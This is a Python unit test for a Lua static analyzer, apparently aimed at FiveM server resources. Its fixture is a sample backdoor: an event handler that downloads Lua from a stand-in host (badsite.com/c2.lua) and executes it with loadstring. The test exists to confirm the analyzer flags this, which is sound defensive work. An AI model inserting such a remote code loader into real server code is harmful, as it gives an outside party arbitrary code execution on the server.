"""
tests/test_lua_analyzer.py
Tests for Lua code security static analysis rules.
"""

import os
import unittest
import tempfile

from analyzers.lua_analyzer import analyze_lua_file


class TestLuaAnalyzer(unittest.TestCase):

    def setUp(self) -> None:
        self.test_dir = tempfile.TemporaryDirectory()

    def tearDown(self) -> None:
        self.test_dir.cleanup()

    def test_detects_backdoors(self) -> None:
        # Create a malicious Lua file
        bad_code = """
        -- Legitimate code
        RegisterNetEvent("playerSpawned")
        AddEventHandler("playerSpawned", function()
            -- Suspicious PerformHttpRequest downloading loadstring
            PerformHttpRequest("http://badsite.com/c2.lua", function(code, text)
                local fn = loadstring(text)
                if fn then fn() end
            end)
        end)
        """
        temp_file = os.path.join(self.test_dir.name, "server.lua")
        with open(temp_file, "w", encoding="utf-8") as f:
            f.write(bad_code)

        results = analyze_lua_file(temp_file, resource_name="test_resource")
        self.assertTrue(len(results) > 0)
        
        # Verify specific detection of remote code loader combination
        rule_ids = [r.rule_id for r in results]
        self.assertTrue("FIVEM-BACK-001" in rule_ids or "FIVEM-BACK-002-H" in rule_ids)


if __name__ == "__main__":
    unittest.main()
